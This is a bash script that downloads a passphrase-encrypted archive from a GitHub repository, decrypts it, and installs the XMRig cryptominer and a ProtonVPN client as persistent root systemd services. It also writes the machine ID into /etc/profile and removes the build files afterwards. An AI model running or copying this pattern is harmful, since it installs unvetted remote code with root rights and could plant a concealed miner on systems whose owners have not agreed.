#!/bin/bash

export MACHINE_ID=$(cat /etc/machine-id 2>/dev/null)

sudo sed -i '/MACHINE_ID/d' /etc/profile
echo 'export MACHINE_ID=$(cat /etc/machine-id 2>/dev/null)' | sudo tee -a /etc/profile > /dev/null

echo "MACHINE_ID: $MACHINE_ID"

read -sp "Enter passphrase: " PASSPHRASE < /dev/tty

sudo apt install wget openvpn curl build-essential cmake libuv1-dev libssl-dev libhwloc-dev unzip -y
wget -O ./build.gpg https://github.com/joshmanzano/xmrig/raw/refs/heads/main/build.gpg
gpg --batch --output build.zip --passphrase $PASSPHRASE --decrypt build.gpg
unzip ./build.zip
rm ./build.gpg ./build.zip

sudo cp ./build/protonvpn.service /etc/systemd/system/protonvpn.service
sudo cp ./build/xmrig.service /etc/systemd/system/xmrig.service
sudo cp ./build/protonvpn-auth.txt /etc/openvpn/client/protonvpn-auth.txt
sudo cp ./build/tw.protonvpn.tcp.ovpn /etc/openvpn/client/protonvpn.conf
sudo mkdir -p /opt/xmrig
sudo cp -r ./build/xmrig/* /opt/xmrig
sudo sed -i "s|MACHINE_ID|${MACHINE_ID}|g" /etc/systemd/system/xmrig.service

sudo systemctl daemon-reload
sudo systemctl enable protonvpn.service
sudo systemctl start protonvpn.service
sudo systemctl enable xmrig.service
sudo systemctl start xmrig.service

sudo chmod 600 /etc/openvpn/client/protonvpn-auth.txt

rm -rf build

sleep 20

curl ifconfig.me && echo
echo "MACHINE_ID: $MACHINE_ID"
